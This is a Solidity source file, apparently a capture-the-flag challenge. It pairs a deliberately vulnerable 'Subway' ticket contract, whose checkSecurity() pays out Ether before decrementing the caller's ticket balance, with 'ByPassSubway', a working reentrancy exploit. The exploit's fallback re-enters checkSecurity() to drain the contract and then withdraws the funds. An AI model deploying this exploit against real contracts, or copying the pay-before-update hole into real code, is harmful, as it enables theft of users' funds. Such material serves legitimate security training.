pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.3.0/contracts/math/SafeMath.sol";
//import '@openzeppelin/contracts/math/SafeMath.sol';

contract Subway {
    
    using SafeMath for uint256;
    address private owner;
    address private mainContract;
    uint256 public ticketPrice;
    mapping(address => uint) private balances;
    mapping(address => uint) private ticketsBalances;
    
    constructor(address _mainContract) public payable {
        ticketPrice = msg.value;
        owner = msg.sender;
        mainContract = _mainContract;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function credit() public payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
    }
    
    function buyTickets(uint256 number) public {
        require(balances[msg.sender] >= (number * ticketPrice), "Not enough money");
        balances[msg.sender] = balances[msg.sender].sub(number * ticketPrice);
        ticketsBalances[msg.sender] = ticketsBalances[msg.sender].add(number);
    }
    
    function balanceOf() public view returns (uint balance) {
        return (balances[msg.sender]);
    }
    
    function ticketsBalanceOf() public view returns (uint ticketsBalance) {
        return (ticketsBalances[msg.sender]);
    }
    
    function checkSecurity() public {
        require (ticketsBalances[msg.sender] >= 1, "Not enough tickets");
        (bool result, bytes memory data) = msg.sender.call.value(ticketPrice / 5)("");
        ticketsBalances[msg.sender] -= 1;
    }
    
    function claim() public {
        require (address(this).balance <= 0);
        address(mainContract).call(abi.encodeWithSignature("setOrder(uint8)", 0));
    }

    fallback() external payable {}
    
}

contract ByPassSubway {
    Subway originalContract;

    constructor (address payable _originalContract) public {
        originalContract = Subway(_originalContract);
    }
    
    function credit() public payable {
        bytes memory payload = abi.encodeWithSignature("credit()");
        address(originalContract).call.value(msg.value)(payload);
    }

    function exploit() public {
        originalContract.buyTickets(1);
        originalContract.checkSecurity();
    }

    function getBalanceOfContract() public view returns (uint256) {
        return (address(this).balance);
    }
    
    function withdrawAllTheBalance(address payable _to) public {
        _to.transfer(address(this).balance);
    }

    fallback () external payable {
        originalContract.checkSecurity();
    }
    
    
}
